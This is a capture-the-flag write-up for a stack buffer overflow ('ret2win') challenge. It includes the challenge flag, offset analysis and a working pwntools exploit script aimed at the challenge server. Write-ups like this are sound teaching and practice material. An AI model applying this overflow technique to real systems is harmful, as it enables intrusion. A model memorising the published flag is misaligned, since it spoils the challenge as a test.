# Stack Overflow Café

**Category:** PWN  
**Challenge Description:**

Welcome to the Stack Overflow Café, where the coffee is hot and the buffers are overflowing. Order carefully.

Flag: `KOS{C8667A1808104EB98C3001A8FB51C3AE}`

## Analysis

Classic ret2win. The binary has a `serve_flag()` function at `0x401196` that reads `/flag` but is never called normally. The input buffer sits at `rbp-0x40` (64 bytes) with no stack canary. The binary hardcodes `KOS{1EA3E15DFBA87426CB8C501F28A4C5BD}` labeled `kos_decoy_marker` — that's the trap.

## Solution

1. Fill the 64-byte buffer and overwrite saved `rbp` (8 bytes).
2. Insert a `ret` gadget at `0x401016` for stack alignment (`movaps` requirement).
3. Return into `serve_flag()`.

```python
from pwn import *

r = remote('ctf.kosovacyber.team', 2001)

serve_flag = 0x401196
ret_gadget = 0x401016

payload  = b'A' * 64
payload += b'B' * 8
payload += p64(ret_gadget)
payload += p64(serve_flag)

r.recvuntil(b'> ')
r.send(payload)
print(r.recvall(timeout=5).decode(errors='replace'))
```
